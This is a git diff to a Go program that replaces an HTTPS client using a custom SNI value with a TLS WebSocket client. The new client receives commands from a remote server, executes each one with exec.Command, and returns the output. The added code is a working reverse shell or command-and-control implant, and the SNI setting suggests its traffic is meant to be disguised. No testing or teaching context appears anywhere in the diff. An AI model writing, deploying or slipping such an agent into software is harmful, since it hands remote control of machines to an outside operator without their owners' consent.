@@ -3,11 +3,11 @@ package main
 import (
 	"crypto/tls"
 	"fmt"
-	"io"
 	"log"
-	"net"
-	"net/http"
 	"os"
+	"os/exec"
+
+	"github.com/gorilla/websocket"
 )
 
 func main() {
@@ -29,45 +29,36 @@ func main() {
 		ServerName:         sniValue,
 	}
 
-	// Create a custom dialer
-	dialer := &tls.Dialer{
-		Config: tlsConfig,
+	dialer := websocket.Dialer{
+		TLSClientConfig: tlsConfig,
 	}
 
-	// Create a custom transport with our dialer
-	transport := &http.Transport{
-		DialTLS: func(network, addr string) (net.Conn, error) {
-			conn, err := dialer.Dial(network, addr)
-			if err != nil {
-				return nil, err
-			}
-			// Type assert to *tls.Conn to access ConnectionState
-			tlsConn := conn.(*tls.Conn)
-			// Handshake is required to populate ConnectionState
-			if err := tlsConn.Handshake(); err != nil {
-				conn.Close()
-				return nil, err
-			}
-			fmt.Printf("Sending request...\n\tIP: %s\n\tSNI:  %s\n", targetIP, tlsConn.ConnectionState().ServerName)
-			return conn, nil
-		},
-	}
-
-	// Create a client with our custom transport
-	client := &http.Client{Transport: transport}
-
-	// Make the HTTPS request
-	resp, err := client.Get(fmt.Sprintf("https://%s:%s", targetIP, targetPort))
+	url := fmt.Sprintf("wss://%s:%s/ws", targetIP, targetPort)
+	conn, _, err := dialer.Dial(url, nil)
 	if err != nil {
-		log.Fatal("Error making request:", err)
+		log.Fatal("Error connecting to WebSocket server:", err)
 	}
-	defer resp.Body.Close()
+	defer conn.Close()
 
-	// Read and print the response body
-	body, err := io.ReadAll(resp.Body)
-	if err != nil {
-		log.Fatal("Error reading response:", err)
+	for {
+		// Read command from server
+		_, message, err := conn.ReadMessage()
+		if err != nil {
+			log.Println("Error reading command:", err)
+			break
+		}
+
+		// Execute the command
+		output, err := exec.Command(string(message)).Output()
+		if err != nil {
+			output = []byte(fmt.Sprintf("Error executing command: %s", err))
+		}
+
+		// Send output back to server
+		err = conn.WriteMessage(websocket.TextMessage, output)
+		if err != nil {
+			log.Println("Error sending output:", err)
+			break
+		}
 	}
-
-	fmt.Printf("Response: [%s]\n", body)
 }
